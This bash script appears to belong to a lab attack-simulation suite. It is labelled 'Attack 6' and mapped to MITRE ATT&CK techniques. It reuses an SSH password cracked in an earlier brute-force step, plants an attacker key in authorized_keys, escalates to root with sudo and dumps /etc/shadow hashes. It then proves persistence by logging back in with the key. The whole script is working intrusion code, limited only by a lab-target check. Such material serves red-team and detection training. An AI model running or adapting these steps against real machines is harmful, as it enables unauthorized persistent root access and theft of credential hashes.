#!/bin/bash
# Attack 6: After attack 4, keep access and become root on victim-ssh.
#   - plant an SSH key in ~/.ssh/authorized_keys      (T1098.004)
#   - sudo to root with the stolen password            (T1548.003)
#   - read /etc/shadow as root                         (T1003.008)
#   - log back in with the planted key, no password    (proves persistence)
source /attacks/lib.sh
banner "Attack 6: Persistence and privilege escalation" "T1098.004 SSH Authorized Keys, T1548.003 Sudo, T1003.008 /etc/shadow"

require_lab_target victim-ssh

USER_NAME="${VICTIM_SSH_USER:-labuser}"
if [[ ! -s "$OUT/04-hydra-ssh.txt" ]]; then
  echo "[error] Run attack 4 first: it finds the password this attack uses" >&2; exit 1
fi
PASS=$(grep -oP 'password: \K\S+' "$OUT/04-hydra-ssh.txt" | head -1)
SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null)

KEY=/tmp/attacker_key
rm -f "$KEY" "$KEY.pub"
ssh-keygen -q -t ed25519 -N "" -C "attacker@lab" -f "$KEY"

echo "[step] Planting SSH key and escalating with sudo"
sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "$USER_NAME@victim-ssh" bash -s <<EOF | tee "$OUT/06-persistence.txt"
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo '$(cat "$KEY.pub")' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo '[victim] key planted'
echo '$PASS' | sudo -S -p '' id
echo '$PASS' | sudo -S -p '' cat /etc/shadow | head -3 | cut -d: -f1,2 | sed 's/:\(.\{12\}\).*/:\1.../'
EOF

echo "[step] Logging back in with the planted key (no password)"
ssh "${SSH_OPTS[@]}" -o PasswordAuthentication=no -o BatchMode=yes -i "$KEY" \
  "$USER_NAME@victim-ssh" 'echo "[victim] key login as $(whoami) works"' | tee -a "$OUT/06-persistence.txt"
done_msg
